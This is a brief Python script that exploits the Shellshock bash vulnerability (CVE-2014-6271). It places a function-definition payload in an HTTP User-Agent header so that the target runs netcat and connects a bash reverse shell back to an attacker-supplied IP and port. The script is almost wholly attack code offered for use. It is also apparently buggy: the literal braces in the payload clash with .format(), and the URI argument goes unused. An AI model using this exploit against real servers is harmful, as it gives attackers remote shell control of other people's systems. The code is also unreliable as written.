#A simple script to exploit shellshock (CVE-2014-6271) vulnerability
# Example: python shellshock.py -t TARGET_IP -u /cgi/test.cgi -r ATTACKER_IP -p ATTACKER_PORT
import requests
import argparse


def main():
    payload = '() { :; }; /bin/bash -c "nc -v {} {} -e /bin/bash -i"'.format(args.remote, args.port) # Reverse shell payload
    try:
        print("Attacking {}".format(args.target))
        headers = {"Content-type": "application/x-www-form-urlencoded",
                "User-Agent": payload}
        req = requests.get(args.target, headers=headers).text
        print(req)

    except:
        print("En error occurred!")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Exploit shellshock vulnerability")
    parser.add_argument("-t", "--target", help="Target IP", required=True)
    parser.add_argument("-u", "--uri",  help='Target URI', required=True)
    parser.add_argument("-r", "--remote", help="Attacker IP to connect back with a shell", required=True)
    parser.add_argument("-p", "--port", help="Attacker port for using in reverse shell", required=True)

    args = parser.parse_args()
    main()
